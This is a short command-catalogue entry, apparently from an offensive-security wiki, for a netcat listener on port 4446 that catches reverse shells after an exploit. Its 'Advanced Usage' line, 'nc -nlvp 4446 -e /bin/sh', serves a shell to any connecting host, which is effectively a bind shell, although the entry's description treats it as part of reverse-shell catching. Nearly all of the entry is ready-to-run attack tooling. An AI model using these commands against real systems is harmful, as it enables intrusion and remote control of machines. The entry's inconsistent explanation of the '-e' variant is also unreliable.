---
id: nc-listen-001
data: nc -nlvp 4446
tags:
  - netcat
  - listener
type: command
output: 'Waiting for incoming connection, then reverse shell upon exploit success'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:09.289Z'
verified: false
validated: true
submitted: true
---
# NC Listen Port 4446

## Command

```bash
nc -nlvp 4446
```

## Description

Starts netcat as a TCP listener on port 4446 for catching reverse shells. Common in RCE exploits to receive outbound connections from targets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | No DNS resolution | Yes |
| -l | Listen mode | Yes |
| -v | Verbose output | Yes |
| -p 4446 | Bind to port 4446 | Yes |

## Examples

### Basic Usage

```bash
nc -nlvp 4446
```

### Advanced Usage

```bash
nc -nlvp 4446 -e /bin/sh
```

## Expected Output

"Listening on [0.0.0.0] (family 0, port 4446)" followed by connection details and shell input upon success.

## Related

- [[Related Procedure: Start-Netcat-Listener-on-Port-4446]]
